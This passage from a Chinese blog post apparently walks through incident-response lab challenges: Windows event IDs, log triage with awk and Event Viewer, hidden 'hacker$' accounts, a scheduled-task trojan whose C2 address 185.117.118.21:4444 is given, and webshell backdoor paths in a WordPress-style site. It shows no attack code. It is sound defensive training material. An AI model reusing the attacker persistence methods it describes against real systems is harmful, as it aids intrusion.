记录用户主动注销，或超时后系统自动注销。</p></li><li><p><strong>4648</strong>- 用户显示凭据登陆</p></li><li><p><strong>4672</strong> - 特权账户登录事件
当管理员或特权账号登录时，记录该事件，检测高权限用户的使用情况。</p></li><li><p><strong>4688</strong> - 新进程创建事件
记录进程的创建信息，能帮助检测恶意软件的执行情况。</p></li><li><p><strong>4697</strong> - 系统上安装服务的事件
记录系统中安装的服务，可以检测未经授权的服务安装。</p></li><li><p><strong>4768</strong> - Kerberos 认证票据授予（TGT）事件
与域控制器的身份验证有关，可以帮助分析域账号是否被滥用。</p></li><li><p><strong>4776</strong> - NTLM 认证失败事件
在 NTLM 认证失败时记录，可以帮助检测异常的身份验证行为。</p></li><li><p><strong>4719</strong> - 审计策略更改事件
系统审计策略的更改，能帮助判断是否有恶意用户试图掩盖痕迹。</p></li></ul><p><strong>系统日志相关事件 ID：</strong></p><ul><li><strong>6005</strong> - 事件日志服务启动
表示系统启动了事件日志服务，通常用于分析系统启动。</li><li><strong>6006</strong> - 事件日志服务停止
表示系统即将关机，通常配合其他日志判断系统是否被异常关机。</li><li><strong>6008</strong> - 非正常关机事件
系统意外关闭时记录，用于检测系统崩溃或强制关机。</li><li><strong>7045</strong> - 服务安装事件
记录系统中安装的新服务，通常用于分析是否有恶意服务被安装。</li></ul><p><strong>应用程序日志相关事件 ID</strong>：</p><ul><li><strong>1000</strong> - 应用程序崩溃事件
记录应用程序崩溃的详细信息，包括错误代码和故障模块名称。</li><li><strong>4621</strong> - 应用程序挂起事件
用于分析应用程序无响应、卡死的原因。</li></ul><h3 id=flag1-2>flag1</h3><p>日志分析，这我在行啊(bushi)，进入靶机先把日志dump下来，放到服务器进行命令查询</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>awk &#39;{print $1}&#39; access.log | sort | uniq -c | sort -nr
</span></span></code></pre></td></tr></table></div></div><p>得到以下信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>   6331 192.168.150.67
</span></span><span class=line><span class=cl>    524 192.168.150.1
</span></span><span class=line><span class=cl>    169 127.0.0.1
</span></span><span class=line><span class=cl>     54 192.168.150.33
</span></span><span class=line><span class=cl>      1 192.168.150.60
</span></span></code></pre></td></tr></table></div></div><p>首先<code>127.0.0.1</code>排除，看日志发现<code>192.168.150.67</code>在进行目录遍历，<code>192.168.150.1</code>都是正常的200请求，<code>192.168.150.33</code>传的一些东西看着像是pickle反序列化，找不出来另外一个请求，再写个命令找找</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>awk &#39;$1 == &#34;192.168.150.60&#34; {print $0}&#39; access.log
</span></span></code></pre></td></tr></table></div></div><p>是个400请求，应该没问题，得到<code>flag{6385}</code></p><h3 id=flag2-2>flag2</h3><p>我们使用事件查看器来解决这个问题，可以<code>win+R</code>然后输入<code>eventvwr.msc</code>，也可以在搜索框里面搜索<strong>事件查看器</strong>，windows日志->安全->筛选当前日志</p><p><img src=/p/xuanji-chapter-4/QQ20250408-200425.jpg width=1491 height=903 srcset="/p/xuanji-chapter-4/QQ20250408-200425_hu_fc6c32bbf04977e9.jpg 480w, /p/xuanji-chapter-4/QQ20250408-200425_hu_405f535dd81b632f.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=165 data-flex-basis=396px></p><p>筛选<strong>4625</strong>事件看到有2594次，得到<code>flag{2594}</code></p><h3 id=flag3-2>flag3</h3><p>还是用这个东西，筛选4624事件，发现有202次，但是我们要的是IP需要，查看事件详细信息可以知道IP</p><p><img src=/p/xuanji-chapter-4/QQ20250408-200915.jpg width=1437 height=810 srcset="/p/xuanji-chapter-4/QQ20250408-200915_hu_68830b39579274ca.jpg 480w, /p/xuanji-chapter-4/QQ20250408-200915_hu_3c874db12b9120c2.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=177 data-flex-basis=425px></p><p>因为确实不多，所以我一直在丁真，找出几个个IP得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>192.168.150.128
</span></span><span class=line><span class=cl>192.168.150.33
</span></span><span class=line><span class=cl>192.168.150.1
</span></span><span class=line><span class=cl>192.168.150.178
</span></span><span class=line><span class=cl>171.218.191.99
</span></span></code></pre></td></tr></table></div></div><p>但是实在是太难找了，于是我在想还有没有什么更方便的方法，筛选<strong>4648</strong>可以知道</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>171.218.191.99
</span></span><span class=line><span class=cl>192.168.150.1
</span></span><span class=line><span class=cl>192.168.150.178
</span></span><span class=line><span class=cl>192.168.150.128
</span></span></code></pre></td></tr></table></div></div><p>想一起交了的，但是发现不对，看到有一个网段是不一样的，于是我把那个去掉了，发现就对了<code>flag{192.168.150.1&amp;192.168.150.128&amp;192.168.150.178}</code></p><h3 id=flag4-2>flag4</h3><p><code>win+R</code>打开<code>lusrmgr.msc</code>，可以打开本地用户组</p><p><img src=/p/xuanji-chapter-4/QQ20250408-203239.jpg width=1118 height=831 srcset="/p/xuanji-chapter-4/QQ20250408-203239_hu_e52fde581b8712bd.jpg 480w, /p/xuanji-chapter-4/QQ20250408-203239_hu_5f92b7f437556182.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=134 data-flex-basis=322px></p><p>找到<code>flag{hacker$}</code></p><h3 id=flag5-1>flag5</h3><p>不知道影子账号是什么，但是很明显啊<code>flag{hackers$}</code></p><h3 id=flag6>flag6</h3><p>要找shell程序，我们可以先看看端口</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>netstat -ano
</span></span></code></pre></td></tr></table></div></div><p>但是没发现，搜索框<strong>计划任务</strong>，发现有个每天都运行的任务</p><p><img src=/p/xuanji-chapter-4/QQ20250408-203904.jpg width=1156 height=312 srcset="/p/xuanji-chapter-4/QQ20250408-203904_hu_ec9cbbe8de7ce90c.jpg 480w, /p/xuanji-chapter-4/QQ20250408-203904_hu_b854addcf4ca482a.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=370 data-flex-basis=889px></p><p>进去一看是<code>download xiaowei.exxe</code>，在这个地方找到<code>C:\Windows\system64\systemWo</code>文件，放进微步云沙箱</p><p><img src=/p/xuanji-chapter-4/QQ20250408-204248.jpg width=1315 height=563 srcset="/p/xuanji-chapter-4/QQ20250408-204248_hu_511c57072c3f872d.jpg 480w, /p/xuanji-chapter-4/QQ20250408-204248_hu_cfeda2ef301d09b5.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=233 data-flex-basis=560px></p><p><code>flag{185.117.118.21:4444}</code></p><h3 id=flag7>flag7</h3><p>刚才我们在那个目录找到的文件就是，<code>flag{xiaowei.exe}</code>，但是为什么运行的时候又是使用的exxe呢，我觉得应该是绕过吧？</p><h3 id=flag8>flag8</h3><p>计划任务里面直接找到bat文件</p><p><img src=/p/xuanji-chapter-4/QQ20250408-204620.jpg width=1224 height=793 srcset="/p/xuanji-chapter-4/QQ20250408-204620_hu_c904147967e9ff9b.jpg 480w, /p/xuanji-chapter-4/QQ20250408-204620_hu_220985966bce1e82.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=154 data-flex-basis=370px></p><p><code>flag{download.bat}</code></p><h2 id=第四章-windows实战-wordpress>第四章 windows实战-wordpress</h2><p>链接的时候把端口带上，这里不是22了</p><h3 id=flag1-3>flag1</h3><p>找攻击成功第一时间看日志，先看到是<code>nginx.htaccess</code>，所以我们看nginx的日志就可以了，一打开一看一大堆的404，这肯定是在目录遍历啊</p><p><img src=/p/xuanji-chapter-4/QQ20250407-195142.jpg width=1572 height=1205 srcset="/p/xuanji-chapter-4/QQ20250407-195142_hu_9d1af98d8a6c9d19.jpg 480w, /p/xuanji-chapter-4/QQ20250407-195142_hu_1ca813116fa69b50.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=130 data-flex-basis=313px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>192.168.141.55 - - [29/Apr/2023:22:44:38 +0800] &#34;POST /index.php/action/login?_=139102b0477b064f9cf570483837d74c HTTP/1.1&#34; 302 5 &#34;http://192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0&#34;
</span></span><span class=line><span class=cl>192.168.141.55 - - [29/Apr/2023:22:44:38 +0800] &#34;GET /manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F HTTP/1.1&#34; 200 7229 &#34;http://192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0&#34;
</span></span><span class=line><span class=cl>192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] &#34;POST /index.php/action/login?_=139102b0477b064f9cf570483837d74c HTTP/1.1&#34; 302 5 &#34;http://192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0&#34;
</span></span></code></pre></td></tr></table></div></div><p>虽然说都进行了302跳转，但是下面的才是最后一次，所以成功时间应该是下面的(渗透思路)，不过我是两个都交<code>flag{2023:04:29 22:45:23}</code></p><h3 id=flag2-3>flag2</h3><p>看日志里面的指纹就知道了<code>flag{Firefox/110.0}</code></p><h3 id=flag3-3>flag3</h3><p>所使用的工具在flag1的图里面已经非常明显了<code>flag{Fuzz Faster U Fool}</code></p><h3 id=flag4-3>flag4</h3><p>找恶意插入的后门文件，直接把www给打包放D盾里面，一下就扫出来了，其实刚才日志里面也有利用的痕迹<code>flag{C:\phpstudy_pro\WWW\.x.php}</code></p><h3 id=flag5-2>flag5</h3><p>D盾也给扫出来了，里面是个<code>file_get_contents</code>，直接就交<code>flag{C:\phpstudy_pro\WWW\usr\themes\default\post.php}</code></p><h3 id=flag6-1>flag6</h3><p>寻找可疑的自启动方式，找exe，在这里找到了</p><p><img src=/p/xuanji-chapter-4/QQ20250407-200319.jpg width=1594 height=1261 srcset="/p/xuanji-chapter-4/QQ20250407-200319_hu_472c384dbdb93fd9.jpg 480w, /p/xuanji-chapter-4/QQ20250407-200319_hu_a98db1a942432151.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=126 data-flex-basis=303px></p><p>看到了<code>360.exe</code>，微步的云沙箱弄一弄，确实是木马，那可以整了，直觉有个bat文件，直接交，后来发现也确实是<code>flag{x.bat}</code></p><h2 id=第四章-windows实战黑页篡改>第四章 windows实战&ndash;黑页&&篡改</h2><p>大家都没做出来，那我也不去浪费金币了</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/>应急响应</a>
<a href=/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/>日志分析</a></section><section class=article-reward style="margin:var(--card-padding)0 0;display:block;text-transform:none;text-align:center"><h3 style="margin:0 0 .75rem;font-size:1.1rem">赞赏支持</h3><figure style="margin:0 auto"><img src=/wechat.png alt loading=lazy style="width:min(260px,90vw);height:auto;border:1px solid #eee;border-radius:12px;background:#fff;padding:6px;box-shadow:0 2px 8px rgba(0,0,0,4%)"><figcaption style=font-size:.9rem;color:#666;margin-top:.5rem></figcaption></figure></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/xuanji-chapter-5/><div class=article-details><h2 class=article-title>玄机第五章</h2></div></a></article><article><a href=/p/xuanji-chapter-2/><div class=article-details><h2 class=article-title>玄机第二章</h2></div></a></article><article><a href=/p/xuanji-chapter-1/><div class=article-details><h2 class=article-title>玄机第一章</h2></div></a></article><article><a href=/p/xuanji-chapter-3/><div class=article-details><h2 class=article-title>玄机第三章</h2></div></a></article><article><a href=/p/xuanji-chapter-6/><div class=article-details><h2 class=article-title>玄机第六章</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>